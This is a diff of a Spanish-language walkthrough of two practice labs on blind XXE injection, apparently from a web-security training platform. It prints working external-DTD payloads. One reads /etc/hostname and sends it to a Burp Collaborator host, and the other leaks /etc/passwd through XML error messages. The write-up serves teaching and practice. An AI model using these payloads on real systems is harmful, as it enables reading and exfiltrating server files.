@@ -540,7 +540,7 @@ Así que al ir a ver el laboratorio nuevamente veremos que nos aparece que esta 
 
 <br>
 
-# Laboratorio 5: Explotación de XXE ciego para exfiltrar datos usando un DTD externo malicioso.
+# Laboratorio 5: Explotación de XXE Blind para exfiltrar datos usando un DTD externo malicioso.
 
 En este laboratorio 5 veremos que nos pide lo siguiente:
 
@@ -574,30 +574,29 @@ Hasta ahora esto ya lo habiamos hecho en el laboratorio anterior, pero ahora el 
 
 ![botones](/assets/images/LabsXXE/lab5/botones.png)
 
-Podemos apreciar que hay 2 opciones nuevas, una para cargar nuestro payload, y otra para subir la flag, iremos a la primera y veremos lo siguiente:
+Podemos apreciar que hay 2 opciones nuevas, una para cargar nuestro exploit, y otra para subir la flag, iremos a la primera y veremos lo siguiente:
 
 ![craft](/assets/images/LabsXXE/lab5/craft.png)
 
-En este apartado es donde vamos a crear nuestro DTD externo, lo que pasa es que en estos laboratorios es necesario hacer esto de forma separada para la seguridad de ellos, así que lo que pasará es que nuestra url del laboratorio apuntará a un archivo que esta dentro de esa misma url, y este archivo será el DTD que vamos a indicarle instrucciónes maliciosas, podemos ver que podemos modificar el nombre del archivo, su contenido y su Header.
+En este apartado es donde vamos a crear nuestro DTD externo, esta parte en la que estamos es una nueva url pero sigue siendo parte del nivel, solo que desde aqui es donde vamos a crear nuestro DTD externo, vemos que hay varias opciones.
 
-En este caso solo modificaremos el contenido, y pondremos el DTD que hará instricciónes maliciosas:
+En este caso solo modificaremos el contenido, y declararemos el DTD externo que hará instricciónes maliciosas:
 
 ```
-
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xcdbuvruomslp2moktnz90fjeak28r.burpcollaborator.net/?content=%file;'>">
 %eval;
 %exfil;
-
 ```
-
 Crear una entidad llamada **file** para tomar el archivo /etc/hostname, esta vez usamos el wrapper **file://** y no el de base64 ya que como este archivo solo tiene 1 linea no tendremos problema al recibir la respuesta.
 
 En la segunda linea estamos declarando la entidad llamada **eval**, la cual esta declarando otra entidad dentro de ella, recordemos que el valor **&#x25;** es el simbolo de porcentaje pero en hexadecimal para que no se confunda la sintaxis.
 
-Después en esa subentidad que declaramos llamada **exfil**, contendrá el contenido el cual conecta con nuestro servidor tercero, y como en la primera entidad llamada **file** ya tomamos lo que nos interesa, simplemente lo mostraremos a través de un parametro llamado **content**, el cual llamará a la entidad **file**.
+Después en esa subentidad que declaramos llamada **exfil**, contendrá el contenido el cual conecta con nuestro servidor tercero, y enviamos la peticion a nuestro servidor tercero ya que ahí podremos ver la respuesta que llegan en el registro de burpcollaborator en este caso, y como en la primera entidad llamada **file** ya tomamos lo que nos interesa, simplemente lo mostraremos a través de un parametro llamado **content**, el cual llamará a la entidad **file**.
 
 Esto ultimo del parametro, lo que hace es llamar a la entidad **file** la cual contiene el valor del archivo que nos interesa, y se hace de esta manera para que en los registros de nuestro servidor tercero podamos apreciar el contenido de ese archivo.
+
+Por último se debe llamar a eval y después a exfil, ya que si llamamos primero a exfil no puede llamarse ya que depende de eval para existir, por lo que primero va eval.
 
 <br>
 
@@ -637,3 +636,146 @@ Y este valor será la flag para terminar el laboratorio:
 Y habremos terminado este nivel:
 
 ![end](/assets/images/LabsXXE/lab5/end.png)
+
+
+# Laboratorio 6: Explotación de XXE blind para recuperar datos a través de mensajes de error
+
+Vemos que nos pide lo siguiente:
+
+![lab6](/assets/images/LabsXXE/lab6/lab6.png)
+
+Podemos observar que nos dice que debemos recuperar el archivo llamado **/etc/passwd**, a través de un DTD externo, para así provocar un error en la respuesta y en base a ese error modificar algun parametro para mostrar lo que queremos.
+
+Primero lo que haremos será entrar a el laboratorio, y recordemos que la parte vulnerable es la siguiente función de comprobar existencias:
+
+![xxe](/assets/images/LabsXXE/lab6/xxe.png)
+
+Y al tramitar esta petición al darle click al boton naranja para que se tramite la petición, la interceptaremos con BurpSuite:
+
+![struct](/assets/images/LabsXXE/lab6/struct.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			6
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y podemos apreciar la estructura XML que se tramita por detras, como ya sabemos intentaremos inyectar una entidad basica:
+
+![not](/assets/images/LabsXXE/lab6/not.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe "Prueba"> ]>
+	<stockCheck>
+		<productId>
+			6
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Podemos apreciar que nos dice que no se pueden inyectar entidades por motivos de seguridad dandonos este mensaje: **"Entities are not allowed for security reasons"**.
+
+<br>
+
+Así que ahora lo que se nos viene a la mente es probar con un DTD externo, para ello haremos uso del burpcollaborator:
+
+![collaborator](/assets/images/LabsXXE/lab6/collaborator.png)
+
+Damos a **"Copy to clipboard"**, para obtener nuestro servidor tercero temporal y desde aquí ver lo que va sucediendo.
+
+Una vez tengamos la url copiada, creremos el DTD externo:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f6mtwp6r71voyhr9ywx16mnn7ed51u.burpcollaborator.net"> %xxe; ]>
+	<stockCheck>
+		<productId>
+			6
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![errormessage](/assets/images/LabsXXE/lab6/errormessage.png)
+
+Y podemos apreciar que ahora no nos da el mensaje de hace un momento, el que decia que no es posible inyectar entidades, en este caso nos da un error mas complejo.
+
+Y en el mensaje de respuesta del error vemos algo interesante:
+
+![url](/assets/images/LabsXXE/lab6/url.png)
+
+Podemos ver que llama a el nombre de la página a la que hizo una petición, por lo que esto nos hace pensar que por medio de un parametro podemos obtener cosas valiosas.
+
+Pero antes de esto primero vemos si la conexión a nuestro servidor tercero se hizo correctamente:
+
+![response](/assets/images/LabsXXE/lab6/response.png)
+
+Al dar a **Poll now** podemos apreciar que tuvimos conexión exitosa, por lo que podemos continuar.
+
+Ahora en el laboratorio veremos lo siguiente:
+
+![expserver](/assets/images/LabsXXE/lab6/expserver.png)
+
+Damos a el boton, esto nos llevara a la página donde crearemos nuestro exploit, veremos lo siguiente:
+
+![craft](/assets/images/LabsXXE/lab6/craft.png)
+
+Y ahora lo que haremos aquí no será lo mismo que en el laboratorio anterior, es algo parecido pero no lo mismo.
+
+![crafted](/assets/images/LabsXXE/lab6/crafted.png)
+
+Podemos apreciar lo siguiente:
+
+```xml
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///archivoinexistente/%file;'>">
+%eval;
+%exfil;
+
+```
+
+En la primera linea estamos definiendo la entidad **file** desde un DTD externo, estamos tomando el archivo **/etc/passwd**.
+
+En la segunda linea estamos declarando otra entidad llamada **eval**, la cual dentro de su definicion de valor estamos definiendo una subentidad llamada **exfil**, recuerda que usamos los caracterés **&#x25;** en lugar del % , ya que en subentidades suele dar error si ponemos el simbolo en formato normal y no en hexadecimal. y esta subentidad va a contener la llamada a un archivo que no existe, pero al final estamos llamando a la entidad **file**, que como sabemos contiene el archivo que nos interesa.
+
+Por último llamamos a las entidades en orden.
+
+Y una vez configurado nuestro exploit, en la parte de arriba nos darán la url, esta url contiene nuestras instrucciónes XML maliciosas.
+
+Ahora en la petición interceptada lo que haremos será que haremos la petición hacia la url que nos ha dado en donde creamos el exploit:
+
+![passwd](/assets/images/LabsXXE/lab6/passwd.png)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a8500d703e64cd8803d6bac01df0023.exploit-server.net/exploit"> %xxe; ]>
+	<stockCheck>
+		<productId>
+			6
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+Y podemos ver que al enviar la petición abajo ya nos muestra el archivo **/etc/passwd**, que queriamos.
+
+Lo que paso fue que hicimos una petición desde la web del laboratorio y como el laboratorio interpreto esas instrucciones que le indicamos de una url externa, interpreto esas instrucciones XML maliciosas en su propio servidor por lo que en la respuesta de error vemos através del wrapper file el archivo que nos interesa.
+
+![passwd](/assets/images/LabsXXE/lab6/passwd.png)
+
+Y con esto hemos terminado este laboratorio.
